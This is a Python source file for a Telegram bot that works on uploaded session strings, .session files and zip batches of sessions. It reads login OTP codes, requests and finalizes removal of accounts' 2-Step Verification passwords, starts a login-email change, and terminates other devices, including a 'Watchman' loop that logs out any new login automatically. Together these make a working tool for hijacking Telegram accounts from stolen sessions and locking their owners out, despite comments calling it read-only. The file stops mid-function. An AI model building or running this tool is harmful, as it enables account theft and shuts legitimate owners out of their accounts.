import asyncio
import logging
import os
import re
import tempfile
import time
import uuid
from datetime import datetime, timezone

from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command, StateFilter
from aiogram.types import BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.account import (
    ResetPasswordRequest,
    GetAuthorizationsRequest,
    ResetAuthorizationRequest,
    SendVerifyEmailCodeRequest,
    VerifyEmailRequest,
)
from telethon.tl.types import EmailVerifyPurposeLoginChange, EmailVerificationCode
from telethon.tl.types.account import ResetPasswordOk, ResetPasswordFailedWait, ResetPasswordRequestedWait

import storage
from config import BOT_TOKEN, OWNER_ID, API_ID, API_HASH, TRUSTED_DEVICE_MODEL
from session_utils import session_string_from_file, session_string_from_pyrogram_string, extract_zip_sessions

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# In-memory account registry: account_id -> {"session": str, "phone": str}
# Nothing here is ever logged out / destroyed — this bot only ever reads.
ACCOUNTS = {}

# Which entry point ("📤 Read OTP" / "🔓 Password Reset" / "🔍 Check Sessions" /
# "👁️ Watchman" / "✉️ Change Email") the NEXT session upload belongs to. Set
# only by tapping one of those buttons — single-owner bot, so a plain global
# is enough, no FSM needed just for routing the upload itself.
CURRENT_MODE = "otp"  # "otp" | "reset" | "sessions" | "watchman" | "email"


class EmailChangeState(StatesGroup):
    """Change Email needs an ordered back-and-forth (new email, then the
    code sent to it), so — unlike every other feature here — it uses real
    FSM state instead of a one-shot button."""
    waiting_for_new_email = State()
    waiting_for_code = State()

# Live Watchman clients: entry_id -> {"client": TelegramClient, "burst_task": asyncio.Task | None}
# Lost on restart — reconnected from storage.get_all_watchmen() in main().
WATCHMEN_CLIENTS = {}

BURST_WINDOW_SECONDS = 15 * 60
BURST_CHECK_INTERVAL = 25

# In-memory batch state for the current .zip run (single-owner bot, so one
# global dict is enough — no multi-user concurrency to worry about).
BATCH = {
    "items": [],     # list of {"name","session","phone","status","error","account_id"}
    "index": -1,
    "success": 0,
    "failed": 0,
    "active": False,
}

# Telegram's official "Login code" messages come from this service user id.
TELEGRAM_SERVICE_ID = 777000
OTP_CODE_RE = re.compile(r"\b(\d{4,7})\b")


def is_owner(user_id: int) -> bool:
    return OWNER_ID != 0 and user_id == OWNER_ID


def gen_account_id() -> str:
    return uuid.uuid4().hex[:10]


def otp_kb(account_id: str, with_next: bool = False) -> InlineKeyboardMarkup:
    rows = [[InlineKeyboardButton(text="🔑 Check OTP", callback_data=f"checkotp_{account_id}")]]
    if with_next:
        rows.append([InlineKeyboardButton(text="➡️ Next", callback_data="batch_next")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def reset_kb(account_id: str, with_next: bool = False) -> InlineKeyboardMarkup:
    rows = [[InlineKeyboardButton(text="🔓 Request Password Reset", callback_data=f"resetpw_{account_id}")]]
    if with_next:
        rows.append([InlineKeyboardButton(text="➡️ Next", callback_data="batch_next")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def format_remaining(until_date_iso: str) -> str:
    until = datetime.fromisoformat(until_date_iso)
    if until.tzinfo is None:
        until = until.replace(tzinfo=timezone.utc)
    delta = until - datetime.now(timezone.utc)
    total_seconds = delta.total_seconds()
    if total_seconds <= 0:
        return "ready now ✅"
    days = int(total_seconds // 86400)
    hours = int((total_seconds % 86400) // 3600)
    return f"{days}d {hours}h remaining"


async def request_password_reset(session_string: str):
    """Triggers (or, after the wait period, finalizes) Telegram's official
    'Forgot password? -> Reset' 2-Step Verification recovery flow — the
    exact same thing the app itself does, just via Telethon.

    Returns (result_dict, error). result_dict["status"] is one of:
      "ok"          -> no password set / password has just been removed
      "waiting"     -> reset requested, result_dict["until_date"] is a
                       timezone-aware datetime for when it becomes final
      "failed_wait" -> a reset was requested too recently, must wait
                       until result_dict["retry_date"] before asking again
    """
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    try:
        await client.connect()
        result = await client(ResetPasswordRequest())
        if isinstance(result, ResetPasswordOk):
            return {"status": "ok"}, None
        if isinstance(result, ResetPasswordRequestedWait):
            return {"status": "waiting", "until_date": result.until_date}, None
        if isinstance(result, ResetPasswordFailedWait):
            return {"status": "failed_wait", "retry_date": result.retry_date}, None
        return {"status": "unknown", "raw": result}, None
    except Exception as e:
        return None, str(e)
    finally:
        await client.disconnect()


async def login_and_get_profile(session_string: str):
    """Connects on demand, fetches phone/user id/username, disconnects.
    Never calls log_out() — a failed/expired session is just reported,
    never destroyed. Returns (profile_dict, error)."""
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return None, "Session is not authorized (logged out or invalid)."
        me = await client.get_me()
        profile = {
            "phone": f"+{me.phone}" if me.phone else "Unknown",
            "user_id": me.id,
            "username": f"@{me.username}" if me.username else "None",
        }
        return profile, None
    except Exception as e:
        return None, str(e)
    finally:
        await client.disconnect()


async def resolve_and_login_text(raw_text: str, work_dir: str):
    """Tries the pasted text as a Telethon session string first. If login
    fails (e.g. it was actually a Pyrogram string and Telethon can't make
    sense of the bytes), automatically converts it as Pyrogram and retries.
    Returns (session_string, profile_dict, error)."""
    profile, error = await login_and_get_profile(raw_text)
    if not error:
        return raw_text, profile, None

    # Fallback: maybe this was a Pyrogram string, not Telethon.
    try:
        converted = session_string_from_pyrogram_string(raw_text, work_dir)
    except Exception as conv_err:
        return None, None, f"Not a valid Telethon session ({error}). Tried as Pyrogram too: {conv_err}"

    profile2, error2 = await login_and_get_profile(converted)
    if error2:
        return None, None, f"Converted from Pyrogram format but still couldn't log in: {error2}"
    return converted, profile2, None


# ---------------------------------------------------------------------------
# /start
# ---------------------------------------------------------------------------

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        return
    await state.clear()  # /start always resets a stuck Change Email flow too
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📤 Read OTP", callback_data="mode_otp")],
        [InlineKeyboardButton(text="🔓 Password Reset", callback_data="mode_reset")],
        [InlineKeyboardButton(text="🔍 Check Sessions", callback_data="mode_sessions")],
        [InlineKeyboardButton(text="👁️ Watchman", callback_data="mode_watchman")],
        [InlineKeyboardButton(text="✉️ Change Email", callback_data="mode_email")],
    ])
    await message.answer(
        "👋 Welcome!\n\n"
        "Choose what you want to do, then send a session as:\n"
        "• a session string\n"
        "• a .session file\n"
        "• a .zip containing multiple sessions",
        reply_markup=kb
    )


@dp.callback_query(F.data == "mode_otp")
async def set_mode_otp(callback: types.CallbackQuery, state: FSMContext):
    if not is_owner(callback.from_user.id):
        return
    global CURRENT_MODE
    CURRENT_MODE = "otp"
    await state.clear()  # in case an in-progress Change Email flow was abandoned
    await callback.message.edit_text("📤 Send the session now — as text, a .session file, or a .zip. I'll read the OTP for it on demand.")
    await callback.answer()


@dp.callback_query(F.data == "mode_reset")
async def set_mode_reset(callback: types.CallbackQuery, state: FSMContext):
    if not is_owner(callback.from_user.id):
        return
    global CURRENT_MODE
    CURRENT_MODE = "reset"
    await state.clear()
    await callback.message.edit_text("🔓 Send the session now — as text, a .session file, or a .zip. I'll request a 2-Step password reset for it.")
    await callback.answer()


@dp.callback_query(F.data == "mode_sessions")
async def set_mode_sessions(callback: types.CallbackQuery, state: FSMContext):
    if not is_owner(callback.from_user.id):
        return
    global CURRENT_MODE
    CURRENT_MODE = "sessions"
    await state.clear()
    await callback.message.edit_text("🔍 Send the session now — as text, a .session file, or a .zip. I'll show its number, user ID, username and logged-in devices.")
    await callback.answer()


@dp.callback_query(F.data == "mode_watchman")
async def set_mode_watchman(callback: types.CallbackQuery, state: FSMContext):
    if not is_owner(callback.from_user.id):
        return
    global CURRENT_MODE
    CURRENT_MODE = "watchman"
    await state.clear()
    await callback.message.edit_text("👁️ Send the session now — as text, a .session file, or a .zip. I'll watch it and auto-terminate any new login that isn't from your trusted device.")
    await callback.answer()


@dp.callback_query(F.data == "mode_email")
async def set_mode_email(callback: types.CallbackQuery, state: FSMContext):
    if not is_owner(callback.from_user.id):
        return
    global CURRENT_MODE
    CURRENT_MODE = "email"
    await state.clear()  # starting fresh — drop any half-finished email change
    await callback.message.edit_text("✉️ Send the session now — as text or a .session file only (no .zip for this one). I'll walk you through changing the login email.")
    await callback.answer()


# ---------------------------------------------------------------------------
# Single session string
# ---------------------------------------------------------------------------

async def process_single_session(message: types.Message, session_string: str, profile: dict, status: types.Message, state: FSMContext):
    """Shared final step once a single session is logged in — branches on
    CURRENT_MODE to send the right follow-up for whichever button started
    this upload."""
    phone = profile["phone"]

    if CURRENT_MODE == "reset":
        await status.edit_text(f"✅ Logged in — `{phone}`\n\n🔍 Requesting password reset...", parse_mode="Markdown")
        await trigger_reset_and_report(message.chat.id, phone, session_string, status)
        return

    if CURRENT_MODE == "sessions":
        account_id = gen_account_id()
        ACCOUNTS[account_id] = {"session": session_string, "phone": phone}
        text = (
            f"📱 Phone Number: `{phone}`\n\n"
            f"🆔 User ID: `{profile['user_id']}`\n\n"
            f"👤 Username: {profile['username']}"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📋 Logged Sessions", callback_data=f"logsess_{account_id}")]
        ])
        await status.edit_text(text, parse_mode="Markdown", reply_markup=kb)
        return

    if CURRENT_MODE == "email":
        await status.edit_text(f"✅ Logged in — `{phone}`\n\n✉️ Send the new email address:", parse_mode="Markdown")
        await state.update_data(email_change_session=session_string, email_change_phone=phone)
        await state.set_state(EmailChangeState.waiting_for_new_email)
        return

    if CURRENT_MODE == "watchman":
        entry_id, error = await activate_watchman(session_string, phone)
        if error:
            await status.edit_text(f"❌ Could not activate Watchman for `{phone}`.\n\nReason: {error}", parse_mode="Markdown")
            return
        await status.edit_text(
            f"👁️ Watchman activated for `{phone}`.\n\n"
            f"Any new login (other than your trusted device) will be terminated automatically. "
            f"Existing sessions are left untouched.",
            parse_mode="Markdown",
            reply_markup=watchman_remove_kb(entry_id)
        )
        return

    # default: "otp"
    account_id = gen_account_id()
    ACCOUNTS[account_id] = {"session": session_string, "phone": phone}
    await status.edit_text(
        f"✅ Logged in!\n\n📱 Number: `{phone}`",
        parse_mode="Markdown",
        reply_markup=otp_kb(account_id)
    )


# StateFilter(None) is important here: without it, this catch-all text
# handler would intercept the new-email / code replies that are meant for
# the Change Email FSM states below, since it has no state restriction of
# its own and aiogram matches handlers in registration order.
@dp.message(F.text & ~F.text.startswith("/"), StateFilter(None))
async def handle_session_text(message: types.Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        return
    raw_text = message.text.strip()
    if len(raw_text) < 20:
        return  # clearly not a session string, ignore quietly

    status = await message.answer("🔍 Logging in, please wait...")
    work_dir = tempfile.mkdtemp(prefix="otp_session_")
    session_string, profile, error = await resolve_and_login_text(raw_text, work_dir)
    if error:
        await status.edit_text(f"❌ Could not log in with this session.\n\nReason: {error}")
        return

    await process_single_session(message, session_string, profile, status, state)


# ---------------------------------------------------------------------------
# .session file / .zip
# ---------------------------------------------------------------------------

@dp.message(F.document)
async def handle_session_document(message: types.Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        return

    doc = message.document
    file_name = doc.file_name or "upload"
    work_dir = tempfile.mkdtemp(prefix="otp_session_")
    local_path = os.path.join(work_dir, file_name)

    tg_file = await bot.get_file(doc.file_id)
    await bot.download_file(tg_file.file_path, local_path)

    if file_name.lower().endswith(".zip"):
        if CURRENT_MODE == "email":
            await message.answer("❌ Change Email doesn't accept a .zip — send a session string or a single .session file.")
            return
        await handle_zip_upload(message, local_path, work_dir)
        return

    if file_name.lower().endswith(".session"):
        status = await message.answer("🔍 Reading session file, please wait...")
        try:
            session_string = session_string_from_file(local_path, work_dir)
        except Exception as e:
            await status.edit_text(f"❌ Session invalid.\n\nReason: {e}")
            return

        profile, error = await login_and_get_profile(session_string)
        if error:
            await status.edit_text(f"❌ Could not log in with this session.\n\nReason: {error}")
            return

        await process_single_session(message, session_string, profile, status, state)
        return

    await message.answer("❌ Unsupported file type. Send a session string, a .session file, or a .zip.")


async def handle_zip_upload(message: types.Message, zip_path: str, work_dir: str):
    mode = CURRENT_MODE
    status = await message.answer("🔍 Reading .zip, please wait...")
    raw_items = extract_zip_sessions(zip_path, work_dir)
    total = len(raw_items)

    items = []
    for item in raw_items:
        if item["error"]:
            items.append({**item, "profile": None, "status": "invalid"})
            continue
        profile, login_error = await login_and_get_profile(item["session"])
        if login_error:
            items.append({**item, "profile": None, "status": "login_failed", "error": login_error})
        else:
            items.append({**item, "profile": profile, "status": "ok"})

    valid_count = sum(1 for i in items if i["status"] == "ok")
    await status.edit_text(f"📦 Found **{total}** session(s) in the zip — **{valid_count}** valid.", parse_mode="Markdown")

    if mode in ("sessions", "watchman"):
        # These two modes don't paginate — every valid account gets its own
        # message immediately, one after another, no "Next" button.
        await process_zip_immediate(message.chat.id, items, mode)
        return

    # "otp" and "reset" keep the existing one-by-one + Next button flow.
    BATCH["items"] = items
    BATCH["index"] = -1
    BATCH["success"] = 0
    BATCH["failed"] = total - valid_count
    BATCH["active"] = True
    BATCH["mode"] = mode

    await send_next_batch_item(message.chat.id)


async def process_zip_immediate(chat_id: int, items: list, mode: str):
    for item in items:
        if item["status"] != "ok":
            continue
        profile = item["profile"]
        phone = profile["phone"]

        if mode == "sessions":
            account_id = gen_account_id()
            ACCOUNTS[account_id] = {"session": item["session"], "phone": phone}
            text = (
                f"📱 Phone Number: `{phone}`\n\n"
                f"🆔 User ID: `{profile['user_id']}`\n\n"
                f"👤 Username: {profile['username']}"
            )
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📋 Logged Sessions", callback_data=f"logsess_{account_id}")]
            ])
            await bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=kb)

        elif mode == "watchman":
            entry_id, error = await activate_watchman(item["session"], phone)
            if error:
                await bot.send_message(chat_id, f"❌ Could not activate Watchman for `{phone}`.\n\nReason: {error}", parse_mode="Markdown")
                continue
            await bot.send_message(
                chat_id,
                f"👁️ Watchman activated for `{phone}`.\n\n"
                f"Any new login (other than your trusted device) will be terminated automatically.",
                parse_mode="Markdown",
                reply_markup=watchman_remove_kb(entry_id)
            )


async def send_next_batch_item(chat_id: int):
    items = BATCH["items"]
    idx = BATCH["index"] + 1

    # Skip invalid / login-failed entries automatically (already counted in
    # BATCH["failed"]) — only valid, logged-in accounts get shown.
    while idx < len(items) and items[idx]["status"] != "ok":
        idx += 1
    BATCH["index"] = idx

    if idx >= len(items):
        BATCH["active"] = False
        await bot.send_message(
            chat_id,
            f"🏁 All done!\n\n✅ Successful: {BATCH['success']}\n❌ Failed: {BATCH['failed']}"
        )
        return

    item = items[idx]
    phone = item["profile"]["phone"]
    account_id = gen_account_id()
    ACCOUNTS[account_id] = {"session": item["session"], "phone": phone}
    item["account_id"] = account_id
    BATCH["success"] += 1

    has_more = any(i["status"] == "ok" for i in items[idx + 1:])
    kb = reset_kb(account_id, with_next=has_more) if BATCH.get("mode") == "reset" else otp_kb(account_id, with_next=has_more)
    await bot.send_message(
        chat_id,
        f"📱 Number: `{phone}`",
        parse_mode="Markdown",
        reply_markup=kb
    )


@dp.callback_query(F.data == "batch_next")
async def batch_next_handler(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return
    await callback.answer()
    if not BATCH["active"]:
        await callback.message.answer("ℹ️ No active batch right now.")
        return
    await send_next_batch_item(callback.message.chat.id)


# ---------------------------------------------------------------------------
# Check OTP — on-demand only, never auto / background
# ---------------------------------------------------------------------------

@dp.callback_query(F.data.startswith("checkotp_"))
async def check_otp_handler(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return

    account_id = callback.data.split("_", 1)[1]
    account = ACCOUNTS.get(account_id)
    if not account:
        await callback.answer("❌ This session is no longer available.", show_alert=True)
        return

    await callback.answer("🔍 Checking...")

    client = TelegramClient(StringSession(account["session"]), API_ID, API_HASH)
    try:
        await client.connect()
        messages = await client.get_messages(TELEGRAM_SERVICE_ID, limit=5)
        otp = None
        for m in messages:
            if m.text:
                match = OTP_CODE_RE.search(m.text)
                if match:
                    otp = match.group(1)
                    break

        if otp:
            await callback.message.reply(otp)
        else:
            await callback.message.reply("❌ No recent OTP found.")
    except Exception as e:
        # Reporting only — the session itself is left completely untouched.
        await callback.message.reply(f"❌ Could not fetch OTP.\n\nReason: {e}")
    finally:
        # Only disconnects THIS on-demand connection. Never client.log_out() —
        # the account's session must survive a failed check.
        await client.disconnect()


# ---------------------------------------------------------------------------
# Check Sessions — view an account's profile + its logged-in devices
# ---------------------------------------------------------------------------

async def build_sessions_list_message(account_id: str, account: dict):
    """Fetches the account's current logged-in devices and builds the
    (text, keyboard) for the 'Logged Sessions' message. The device that IS
    this very lookup connection (marked `current` by Telegram) is listed
    but never given a Terminate button — terminating it would log the
    session itself out, which this bot never does."""
    client = TelegramClient(StringSession(account["session"]), API_ID, API_HASH)
    try:
        await client.connect()
        result = await client(GetAuthorizationsRequest())
    finally:
        await client.disconnect()

    lines = [f"📋 Logged Sessions for `{account['phone']}`\n"]
    kb_rows = []
    for idx, auth in enumerate(result.authorizations, start=1):
        device = auth.device_model or "Unknown device"
        if auth.current:
            lines.append(f"{idx}. {device} — this lookup connection (not terminable)\n")
            continue
        lines.append(
            f"{idx}. {device}\n"
            f"   {auth.platform or ''} {auth.system_version or ''}\n"
            f"   📍 {auth.country or 'Unknown location'}\n"
            f"   🕒 Last active: {auth.date_active}\n"
        )
        kb_rows.append([InlineKeyboardButton(text=f"❌ Terminate: {device}", callback_data=f"termsess_{account_id}_{auth.hash}")])

    kb_rows.append([InlineKeyboardButton(text="🔄 Refresh Sessions", callback_data=f"logsess_{account_id}")])
    return "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=kb_rows)


@dp.callback_query(F.data.startswith("logsess_"))
async def logged_sessions_handler(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return
    account_id = callback.data.split("_", 1)[1]
    account = ACCOUNTS.get(account_id)
    if not account:
        await callback.answer("❌ This session is no longer available.", show_alert=True)
        return

    await callback.answer("🔍 Fetching...")
    try:
        text, kb = await build_sessions_list_message(account_id, account)
    except Exception as e:
        await callback.message.reply(f"❌ Could not fetch sessions.\n\nReason: {e}")
        return

    # If this came from tapping "Refresh Sessions", edit in place; otherwise
    # (first tap from the profile message) send a fresh message.
    if callback.message.text and callback.message.text.startswith("📋 Logged Sessions"):
        await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=kb)
    else:
        await bot.send_message(callback.message.chat.id, text, parse_mode="Markdown", reply_markup=kb)


@dp.callback_query(F.data.startswith("termsess_"))
async def terminate_session_handler(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return
    _, account_id, hash_str = callback.data.split("_", 2)
    account = ACCOUNTS.get(account_id)
    if not account:
        await callback.answer("❌ This session is no longer available.", show_alert=True)
        return

    await callback.answer("🔍 Terminating...")
    client = TelegramClient(StringSession(account["session"]), API_ID, API_HASH)
    try:
        await client.connect()
        await client(ResetAuthorizationRequest(hash=int(hash_str)))
        await callback.message.reply("✅ Session terminated.")
    except Exception as e:
        await callback.message.reply(f"❌ Could not terminate session.\n\nReason: {e}")
    finally:
        await client.disconnect()


# ---------------------------------------------------------------------------
# 2-Step Verification password reset (Telegram's own "Forgot password?" flow)
# ---------------------------------------------------------------------------

async def trigger_reset_and_report(chat_id: int, phone: str, session_string: str, status_msg: types.Message = None):
    """Runs request_password_reset and sends/edits a message with the
    outcome — shared by the single-session reset flow, the zip-batch reset
    flow, and the per-account resetpw_ button."""
    result, error = await request_password_reset(session_string)

    if error:
        text = f"❌ Could not request a password reset for `{phone}`.\n\nReason: {error}"
    elif result["status"] == "ok":
        text = f"✅ No 2-Step password is set on `{phone}` (or it was already removed)."
    elif result["status"] == "failed_wait":
        text = (
            f"⚠️ A reset was already requested recently for `{phone}`. "
            f"Try again after {result['retry_date']}."
        )
    elif result["status"] == "waiting":
        entry_id = f"reset_{uuid.uuid4().hex[:10]}"
        until_iso = result["until_date"].isoformat()
        storage.add_pending(entry_id, phone, session_string, until_iso)
        text = (
            f"🔓 Password reset requested for `{phone}`!\n\n"
            f"⏳ {format_remaining(until_iso)}\n\n"
            f"I'll message you here the moment it's ready to finalize — or check anytime with /pending.\n\n"
            f"Nothing happens automatically before then, and the request never touches the session itself."
        )
    else:
        text = f"⚠️ Unexpected response from Telegram: {result}"

    if status_msg:
        await status_msg.edit_text(text, parse_mode="Markdown")
    else:
        await bot.send_message(chat_id, text, parse_mode="Markdown")


@dp.callback_query(F.data.startswith("resetpw_"))
async def request_reset_handler(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return
    account_id = callback.data.split("_", 1)[1]
    account = ACCOUNTS.get(account_id)
    if not account:
        await callback.answer("❌ This session is no longer available.", show_alert=True)
        return

    await callback.answer("🔍 Requesting...")
    await trigger_reset_and_report(callback.message.chat.id, account["phone"], account["session"])


@dp.callback_query(F.data.startswith("finalize_"))
async def finalize_reset_handler(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return
    entry_id = callback.data.split("_", 1)[1]
    entry = storage.get_pending(entry_id)
    if not entry:
        await callback.answer("❌ Not found — maybe already finalized.", show_alert=True)
        return

    await callback.answer("🔍 Checking with Telegram...")
    result, error = await request_password_reset(entry["session"])
    if error:
        await callback.message.reply(f"❌ Could not finalize.\n\nReason: {error}")
        return

    if result["status"] == "ok":
        storage.remove_pending(entry_id)
        await callback.message.reply(
            f"✅ 2-Step password has been removed for `{entry['phone']}`!\n\n"
            f"You can now log in with just the OTP, or set a new password from the account's own Settings.",
            parse_mode="Markdown"
        )
        return

    if result["status"] == "waiting":
        until_iso = result["until_date"].isoformat()
        storage.update_until_date(entry_id, until_iso)
        await callback.message.reply(f"⏳ Not ready yet for `{entry['phone']}`.\n\n{format_remaining(until_iso)}", parse_mode="Markdown")
        return

    await callback.message.reply(f"⚠️ Unexpected response: {result}")


@dp.message(Command("pending"))
async def cmd_pending(message: types.Message):
    if not is_owner(message.from_user.id):
        return
    pending = storage.get_all_pending()
    if not pending:
        await message.answer("ℹ️ No pending password-reset requests right now.")
        return

    for entry_id, entry in pending.items():
        remaining = format_remaining(entry["until_date"])
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔁 Try Finalize Now", callback_data=f"finalize_{entry_id}")]
        ])
        await message.answer(f"📱 `{entry['phone']}`\n⏳ {remaining}", parse_mode="Markdown", reply_markup=kb)


async def reset_watcher():
    """Background loop: every hour, checks pending reset requests and — only
    when the 7-day wait is actually over — sends the owner a notification
    with a button to finalize. It never finalizes on its own; removing the
    password always needs an explicit tap, same as every other action here."""
    while True:
        try:
            pending = storage.get_all_pending()
            now = datetime.now(timezone.utc)
            for entry_id, entry in pending.items():
                if entry.get("notified_ready"):
                    continue
                until = datetime.fromisoformat(entry["until_date"])
                if until.tzinfo is None:
                    until = until.replace(tzinfo=timezone.utc)
                if now >= until:
                    kb = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="✅ Finalize - Remove Password Now", callback_data=f"finalize_{entry_id}")]
                    ])
                    await bot.send_message(
                        OWNER_ID,
                        f"⏰ Ready! The 2-Step password for `{entry['phone']}` can now be removed.\n\n"
                        f"Tap below whenever you want to finalize — this won't happen on its own.",
                        parse_mode="Markdown",
                        reply_markup=kb
                    )
                    storage.mark_notified(entry_id)
        except Exception:
            logging.exception("reset_watcher loop error")
        await asyncio.sleep(3600)


# ---------------------------------------------------------------------------
# Bot command menu (the "/" menu every bot shows)
# ---------------------------------------------------------------------------

async def setup_commands():
    await bot.set_my_commands([
        BotCommand(command="start", description="Start the bot / choose a mode"),
        BotCommand(command="pending", description="View pending password-reset requests"),
        BotCommand(command="watchmenids", description="View active Watchman sessions"),
    ])


# ---------------------------------------------------------------------------
# Watchman — permanent login-guard on an account
# ---------------------------------------------------------------------------

def watchman_remove_kb(entry_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛑 Remove Watchman", callback_data=f"rmwatch_{entry_id}")]
    ])


async def notify_owner_termination(phone: str, auth) -> None:
    text = (
        f"🚨 New login detected and terminated!\n\n"
        f"📱 Account: `{phone}`\n\n"
        f"Terminated session details:\n"
        f"• Device: {auth.device_model or 'Unknown'}\n"
        f"• Platform: {auth.platform or 'Unknown'} {auth.system_version or ''}\n"
        f"• App: {auth.app_name or 'Unknown'} {auth.app_version or ''}\n"
        f"• Location: {auth.country or 'Unknown'}\n"
        f"• IP: {auth.ip or 'Unknown'}\n"
        f"• Logged in at: {auth.date_created}"
    )
    try:
        await bot.send_message(OWNER_ID, text, parse_mode="Markdown")
    except Exception:
        logging.exception("Could not send Watchman termination alert to owner")


async def check_for_new_sessions(entry_id: str) -> None:
    """One pass: compares the account's current authorizations against the
    known baseline. A brand-new one is terminated and reported, UNLESS its
    device model matches TRUSTED_DEVICE_MODEL (that's just the owner
    logging in themselves) — trusted logins are added to the baseline
    silently and left alone."""
    state = WATCHMEN_CLIENTS.get(entry_id)
    if not state:
        return
    entry = storage.get_watchman(entry_id)
    if not entry:
        return

    client = state["client"]
    result = await client(GetAuthorizationsRequest())
    baseline = set(entry.get("known_hashes", []))
    newly_terminated = []

    for auth in result.authorizations:
        if auth.hash in baseline:
            continue
        device_model = (auth.device_model or "").strip()
        if device_model.lower() == TRUSTED_DEVICE_MODEL.strip().lower():
            baseline.add(auth.hash)
            continue
        try:
            await client(ResetAuthorizationRequest(hash=auth.hash))
            baseline.add(auth.hash)
            newly_terminated.append(auth)
        except Exception:
            logging.exception(f"Watchman: failed to terminate a new session for {entry_id}")

    storage.update_watchman_known_hashes(entry_id, list(baseline))

    for auth in newly_terminated:
        await notify_owner_termination(entry["phone"], auth)


async def burst_monitor(entry_id: str) -> None:
    """Runs for BURST_WINDOW_SECONDS after a login-code message is seen,
    polling every BURST_CHECK_INTERVAL seconds — this covers the gap
    between the OTP arriving and the person actually finishing login."""
    end_time = time.monotonic() + BURST_WINDOW_SECONDS
    try:
        while time.monotonic() < end_time:
            try:
                await check_for_new_sessions(entry_id)
            except Exception:
                logging.exception(f"Watchman: burst check failed for {entry_id}")
            await asyncio.sleep(BURST_CHECK_INTERVAL)
    finally:
        state = WATCHMEN_CLIENTS.get(entry_id)
        if state:
            state["burst_task"] = None


async def trigger_burst(entry_id: str) -> None:
    state = WATCHMEN_CLIENTS.get(entry_id)
    if not state:
        return
    existing = state.get("burst_task")
    if existing and not existing.done():
        existing.cancel()  # a new login-code message restarts the window
    state["burst_task"] = asyncio.create_task(burst_monitor(entry_id))


def _make_watchman_handler(entry_id: str):
    async def handler(_event):
        await trigger_burst(entry_id)
    return handler


async def activate_watchman(session_string: str, phone: str):
    """Connects and stays connected — Watchman is the one feature in this
    bot that's deliberately NOT on-demand, since it has to be listening at
    all times to react to a login attempt. Returns (entry_id, error)."""
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None, "Session is not authorized (logged out or invalid)."
        result = await client(GetAuthorizationsRequest())
        baseline_hashes = [a.hash for a in result.authorizations]
    except Exception as e:
        try:
            await client.disconnect()
        except Exception:
            pass
        return None, str(e)

    entry_id = f"watch_{uuid.uuid4().hex[:10]}"
    storage.add_watchman(entry_id, phone, session_string, baseline_hashes)

    client.add_event_handler(_make_watchman_handler(entry_id), events.NewMessage(from_users=TELEGRAM_SERVICE_ID))
    WATCHMEN_CLIENTS[entry_id] = {"client": client, "burst_task": None}
    return entry_id, None


async def stop_watchman(entry_id: str) -> None:
    """Removes Watchman for one account. Only ever disconnects the
    background monitoring connection — never touches the session itself."""
    state = WATCHMEN_CLIENTS.pop(entry_id, None)
    if state:
        burst_task = state.get("burst_task")
        if burst_task and not burst_task.done():
            burst_task.cancel()
        try:
            await state["client"].disconnect()
        except Exception:
            pass
    storage.remove_watchman(entry_id)


@dp.callback_query(F.data.startswith("rmwatch_"))
async def remove_watchman_handler(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return
    entry_id = callback.data.split("_", 1)[1]
    entry = storage.get_watchman(entry_id)
    if not entry:
        await callback.answer("❌ Not found — maybe already removed.", show_alert=True)
        return

    await callback.answer("🛑 Removing...")
    phone = entry["phone"]
    await stop_watchman(entry_id)
    await callback.message.reply(
        f"🛑 Watchman removed for `{phone}`.\n\nOnly the background connection was disconnected — the session itself was not touched.",
        parse_mode="Markdown"
    )


@dp.message(Command("watchmenids"))
async def cmd_watchmenids(message: types.Message):
    if not is_owner(message.from_user.id):
        return
    all_watchmen = storage.get_all_watchmen()
    if not all_watchmen:
        await message.answer("ℹ️ No active Watchman sessions right now.")
        return
    for entry_id, entry in all_watchmen.items():
        await message.answer(f"👁️ `{entry['phone']}`", parse_mode="Markdown", reply_markup=watchman_remove_kb(entry_id))


async def restore_watchmen() -> None:
    """Called once at startup — reconnects every Watchman that was active
    before the last restart, from the persistent store."""
    all_watchmen = storage.get_all_watchmen()
    for entry_id, entry in all_watchmen.items():
        client = TelegramClient(StringSession(entry["session"]), API_ID, API_HASH)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                logging.warning(f"Watchman {entry_id} ({entry['phone']}) session no longer authorized — skipping restore.")
                await client.disconnect()
                continue
            client.add_event_handler(_make_watchman_handler(entry_id), events.NewMessage(from_users=TELEGRAM_SERVICE_ID))
